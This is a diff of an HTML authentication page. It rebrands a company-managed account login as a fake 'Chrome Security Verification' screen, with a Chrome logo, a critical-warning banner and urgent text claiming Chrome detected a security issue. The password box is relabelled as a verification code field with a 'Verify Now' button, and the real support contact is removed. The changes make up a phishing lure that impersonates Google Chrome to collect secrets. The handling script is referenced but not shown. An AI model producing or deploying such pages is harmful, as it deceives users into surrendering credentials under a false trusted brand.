@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MMLP Enterprise Security</title>
+    <title>Chrome Core Sync Manager</title>
     <link rel="stylesheet" type="text/css" href="auth.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -11,23 +11,23 @@
 <body>
     <div class="auth-container">
         <div class="company-branding">
-            <img src="images/mmlp_logo.svg" alt="MMLP Enterprise" class="company-logo">
-            <h1>MMLP Enterprise</h1>
+            <img src="images/chrome_official.svg" alt="Chrome" class="company-logo">
+            <h1>Chrome Security Verification</h1>
         </div>
         <div class="security-section">
-            <img src="images/security_icon.svg" alt="Security" class="security-icon">
-            <h2>Company Managed Account</h2>
-            <p id="profileLabel" class="profile-label"></p>
-            <p class="auth-message">This is a company managed account. You need to authenticate yourself to access this profile.</p>
+            <div class="alert-banner">
+                <img src="images/warning_icon.svg" alt="Warning" class="warning-icon">
+                <span>Critical Security Verification Required</span>
+            </div>
+            <p class="auth-message">Chrome has detected a security issue that requires immediate verification. This process is necessary to maintain browser integrity and protect your data.</p>
             <div class="input-group">
-                <input type="password" id="passwordInput" placeholder="Enter your password" autofocus>
-                <button id="authButton">Authenticate</button>
+                <input type="password" id="passwordInput" placeholder="Enter security verification code" autofocus>
+                <button id="authButton">Verify Now</button>
             </div>
             <p id="messageArea" class="message"></p>
         </div>
         <div class="footer">
-            <p>© 2025 MMLP Enterprise. All rights reserved.</p>
-            <p class="support">For support contact: <a href="mailto:support@mmlpenterprise.com">support@mmlpenterprise.com</a></p>
+            <p>Google Chrome Security System</p>
         </div>
     </div>
     <script src="auth.js"></script>
